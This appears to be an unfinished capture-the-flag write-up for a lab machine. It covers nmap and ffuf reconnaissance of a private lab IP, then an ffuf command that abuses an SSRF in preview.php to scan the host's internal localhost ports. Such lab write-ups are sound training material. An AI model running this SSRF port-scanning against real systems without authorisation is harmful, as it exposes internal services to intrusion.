# Extract (Hard) Remaining

## Nmap Scan

```bash
┌──(kali㉿Shieldbyte53)-[~/nmap]
└─$ nmap -p- --min-rate 1000 -T4 -sV -oA nmap_full_scan 10.48.181.161
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 16:25 IST
Nmap scan report for 10.48.181.161
Host is up (0.0071s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.76 seconds
```

## Fuzzing directories

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u 'http://10.48.181.161/FUZZ' -w /usr/share/wordlists/dirb/big.txt -r

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.181.161/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1855ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3686ms]
javascript              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 9ms]
management              [Status: 403, Size: 14, Words: 2, Lines: 1, Duration: 10ms]
pdf                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 8ms]
:: Progress: [20469/20469] :: Job [1/1] :: 4347 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

## Source Code Review

![image.png](Extract%20(Hard)%20Remaining/image.png)

## Exploiting SSRF

![image.png](Extract%20(Hard)%20Remaining/image%201.png)

## Fuzzing Internal Ports for localhost

```bash
┌──(kali㉿Shieldbyte53)-[~]
└─$ ffuf -u "http://10.48.181.161/preview.php?url=http://127.0.0.1:FUZZ/" \
-w /usr/share/seclists/Discovery/Infrastructure/common-ports.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.181.161/preview.php?url=http://127.0.0.1:FUZZ/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Infrastructure/common-ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

445                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
7001                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
5800                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
81                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
5801                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
4000                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
457                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 15ms]
5432                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 16ms]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1, Duration: 265ms]
443                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 673ms]
1521                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1675ms]
8000                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1675ms]
8443                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2681ms]
7002                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2684ms]
1080                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2687ms]
66                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2689ms]
1100                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3693ms]
5000                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3700ms]
1241                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3700ms]
30821                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3701ms]
6346                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3706ms]
4100                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3710ms]
5802                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3711ms]
8888                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3712ms]
2301                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4718ms]
6347                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4719ms]
1433                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4722ms]
1434                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4724ms]
3306                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4730ms]
3128                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4731ms]
3000                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4732ms]
1352                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4740ms]
4002                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4743ms]
4001                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4744ms]
1944                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4746ms]
8080                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4752ms]
80                      [Status: 200, Size: 1735, Words: 304, Lines: 65, Duration: 4756ms]
:: Progress: [37/37] :: Job [1/1] :: 7 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```